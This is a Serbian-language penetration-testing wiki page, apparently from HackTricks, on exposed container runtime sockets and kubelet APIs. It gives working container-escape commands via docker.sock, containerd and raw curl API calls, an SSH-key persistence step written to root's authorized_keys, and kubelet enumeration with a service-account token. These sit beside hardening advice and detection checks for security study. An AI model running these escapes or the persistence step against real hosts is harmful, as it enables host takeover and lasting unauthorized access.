# Runtime API i izloženost daemon-a

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni container kompromisi uopšte ne počinju namespace escape-om. Počinju pristupom runtime control plane-u. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman ili kubelet-om preko montiranog Unix socket-a ili izloženog TCP listener-a, attacker može da zatraži novi container sa većim privilegijama, montira host filesystem, pridruži se host namespace-ovima ili preuzme osetljive informacije o node-u. U tim slučajevima, runtime API predstavlja stvarnu bezbednosnu granicu, a njegov kompromis je funkcionalno veoma blizu kompromitovanju host-a.

Zbog toga izloženost runtime socket-a treba dokumentovati odvojeno od kernel zaštita. Container sa uobičajenim seccomp-om, capabilities i MAC izolacijom i dalje može biti udaljen samo jednim API pozivom od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran unutar njega. Kernel izolacija trenutnog container-a može raditi tačno onako kako je predviđeno, dok runtime management plane ostaje potpuno izložen.

## Modeli pristupa daemon-u

Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socket-a na `unix:///var/run/docker.sock`. Istorijski je takođe bio izložen na daljinu preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-om zaštićenog listener-a na `2376`. Izlaganje daemon-a na daljinu bez snažnog TLS-a i autentikacije klijenata praktično pretvara Docker API u udaljeni root interfejs.

containerd, CRI-O, Podman i kubelet izlažu slične površine sa velikim uticajem. Nazivi i workflow-i se razlikuju, ali logika ostaje ista. Ako interfejs omogućava pozivaocu da kreira workload-e, montira host putanje, preuzima credentials ili menja pokrenute container-e, taj interfejs je privilegovani management channel i tako ga treba tretirati.

Uobičajene lokalne putanje koje treba proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stariji ili specijalizovaniji stack-ovi mogu takođe izložiti endpoint-e kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Oni su ređi u modernim okruženjima, ali kada se otkriju, treba ih tretirati sa istim oprezom, jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione socket-e.

## Bezbedan udaljeni pristup

Ako daemon mora biti izložen izvan lokalnog socket-a, konekcija treba da bude zaštićena pomoću TLS-a, po mogućnosti uz međusobnu autentikaciju, tako da daemon verifikuje klijenta, a klijent verifikuje daemon. Stara praksa otvaranja Docker daemon-a preko plain HTTP-a radi jednostavnosti jedna je od najopasnijih grešaka u administraciji container-a, jer je API površina dovoljno moćna da direktno kreira privilegovane container-e.

Istorijski obrazac Docker konfiguracije izgledao je ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostovima zasnovanim na systemd-u, komunikacija sa daemon-om može se pojaviti i kao `fd://`, što znači da proces nasleđuje unapred otvoren socket od systemd-a, umesto da ga sam direktno bind-uje. Važna lekcija nije tačna sintaksa, već bezbednosna posledica. Čim daemon sluša izvan lokalnog socket-a sa strogo ograničenim dozvolama, bezbednost transporta i autentikacija klijenata postaju obavezne, a ne opcione mere hardening-a.

## Abuse

Ako je runtime socket prisutan, potvrdite koji je to socket, da li postoji kompatibilan klijent i da li je moguć pristup putem raw HTTP-a ili gRPC-a:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ove komande su korisne jer razlikuju nepostojeću putanju, montirani ali nedostupni socket i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.

### Kada klijent nije instaliran

Odsustvo alatke `docker`, `podman` ili drugog praktičnog CLI-ja ne znači da je socket bezbedan. Docker Engine koristi HTTP preko svog Unix socket-a, a Podman izlaže i Docker-compatible API i Libpod-native API putem `podman system service`. To znači da minimalno okruženje koje sadrži samo `curl` i dalje može biti dovoljno za upravljanje daemon-om:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ovo je važno tokom post-exploitation faze zato što defenders ponekad uklone uobičajene klijentske binarne fajlove, ali ostave management socket montiran. Na Podman hostovima imajte na umu da se putanja visoke vrednosti razlikuje između rootful i rootless deploymenta: `unix:///run/podman/podman.sock` za rootful service instance i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless instance.

### Kompletan primer: Docker Socket To Host Root

Ako je `docker.sock` dostupan, klasičan escape podrazumeva pokretanje novog containera koji montira root filesystem hosta, a zatim izvršavanje `chroot` unutar njega:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo omogućava direktno izvršavanje sa host-root privilegijama putem Docker daemon-a. Uticaj nije ograničen samo na čitanje datoteka. Kada uđe u novi container, attacker može da menja datoteke na hostu, prikuplja credentials, postavi persistence ili pokrene dodatne privilegovane workload-e.

### Potpun primer: Docker Socket do Host Namespaces

Ako attacker preferira ulazak u namespace umesto pristupa koji je ograničen samo na filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ovaj put dolazi do hosta tako što se od runtime-a zahteva kreiranje novog container-a sa eksplicitnim izlaganjem host namespace-ova, umesto iskorišćavanja trenutnog container-a.

### Docker Socket Persistence Pattern

Runtime kontrola može da se koristi i za persistence, a ne samo za one-shot shell. Generički obrazac podrazumeva kreiranje pomoćnog container-a sa mount-om hosta, upisivanje materijala za autorizovani pristup ili startup hook-a u montirani filesystem hosta, a zatim proveru da li ga host koristi.

Oblik primera:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ista ideja može ciljati systemd jedinice, cron fragmente, datoteke za pokretanje aplikacija ili SSH ključeve, u zavisnosti od toga šta operater želi da dokaže. Važno je da se trajna izmena izvršava kroz ovlašćenja runtime daemon-a nad filesystem-om na nivou hosta, a ne kroz dodatne privilegije u originalnom container-u.

### Pivot preko Raw Docker API Helper-a

Kada Docker CLI nije dostupan, isti tok sa helper-om i host mount-om može se izvršiti putem HTTP-a preko Unix socket-a. Opšti tok je: potvrditi API, kreirati helper container sa host bind mount-om, pokrenuti ga, kreirati exec instancu i pokrenuti taj exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Konačan zahtev `/exec/<id>/start` zavisi od vraćenog exec ID-ja, ali bezbednosna poenta je nezavisna od tačnog JSON povezivanja: direktan API pristup rootful Docker daemon-u dovoljan je za zahtev za jači pomoćni workload.

### Pun primer: containerd Socket

Montirani `containerd` socket je obično podjednako opasan:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ako je prisutan klijent sličniji Docker-u, `nerdctl` može biti praktičniji od `ctr` jer izlaže poznate opcije kao što su `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Uticaj je ponovo kompromitovanje hosta. Čak i ako Docker-specifični alati nisu prisutni, drugi runtime API i dalje može pružati ista administrativna ovlašćenja. Na Kubernetes nodovima, `crictl` takođe može biti dovoljan za izviđanje i interakciju sa containerima, jer direktno komunicira sa CRI endpointom.

### BuildKit Socket

`buildkitd` se lako previdi zato što ga ljudi često smatraju „samo build backendom“, ali daemon je i dalje privilegovana kontrolna ravan. Dostupan `buildkitd.sock` može napadaču omogućiti izvršavanje proizvoljnih build koraka, pregled mogućnosti worker-a, korišćenje lokalnih konteksta iz kompromitovanog okruženja i zahtevanje opasnih entitlements-a kao što su `network.host` ili `security.insecure`, kada je daemon konfigurisan da ih dozvoli.

Korisne početne interakcije su:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ako daemon prihvata build zahteve, proverite da li su dostupni nesigurni entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Tačan uticaj zavisi od konfiguracije daemon-a, ali rootful BuildKit servis sa permisivnim entitlements nije bezazlena pogodnost za developere. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, naročito na CI runner-ima i deljenim build čvorovima.

### Kubelet API preko TCP-a

Kubelet nije container runtime, ali je i dalje deo ravni za upravljanje čvorom i često se razmatra u okviru iste granice poverenja. Ako je kubelet secure port `10250` dostupan iz workload-a ili ako su node credentials, kubeconfig fajlovi ili proxy prava izloženi, attacker može biti u mogućnosti da izlista Pods, preuzme logove ili izvršava komande u container-ima lokalnim za node, a da pritom uopšte ne prolazi kroz admission putanju Kubernetes API servera.

Počnite jeftinom discovery fazom:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ako kubelet ili API-server proxy putanja autorizuje `exec`, klijent koji podržava WebSocket može to da pretvori u izvršavanje koda u drugim containerima na nodu. To je takođe razlog zbog kog je `nodes/proxy` sa samo `get` dozvolom opasniji nego što zvuči: zahtev i dalje može da dođe do kubelet endpointa koji izvršavaju komande, a te direktne interakcije sa kubeletom ne pojavljuju se u uobičajenim Kubernetes audit logovima.

## Provere

Cilj ovih provera je da utvrde da li container može da dođe do bilo koje upravljačke ravni koja je trebalo da ostane izvan granice poverenja.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Šta je ovde interesantno:

- Montirani runtime socket je obično direktan administrativni primitiv, a ne samo otkrivanje informacija.
- TCP listener na `2375` bez TLS-a treba tretirati kao uslov za remote compromise.
- Environment variables kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran za komunikaciju sa host runtime-om.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Lokalni Unix socket po podrazumevanim postavkama | `dockerd` osluškuje lokalni socket, a daemon je obično rootful | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slab ili nedostajući TLS na `2376` |
| Podman | CLI bez daemona po podrazumevanim postavkama | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i i dalje mogu biti izloženi kada je omogućen `podman system service` | izlaganje `podman.sock`, široko pokretanje service-a, rootful API upotreba |
| containerd | Lokalni privilegovani socket | Administrativni API je izložen preko lokalnog socket-a i obično ga koriste alati višeg nivoa | montiranje `containerd.sock`, širok `ctr` ili `nerdctl` pristup, izlaganje privilegovanih namespace-ova |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen pouzdanim komponentama na samom node-u | montiranje `crio.sock`, izlaganje CRI endpoint-a nepouzdanim workload-ima |
| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko dostupan iz Pod-ova; pristup može otkriti stanje Pod-ova, credentials i funkcije za izvršavanje, u zavisnosti od authn/authz podešavanja | montiranje kubelet socket-a ili cert-ova, slaba kubelet autentikacija, host networking uz dostupan kubelet endpoint |

## Reference

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
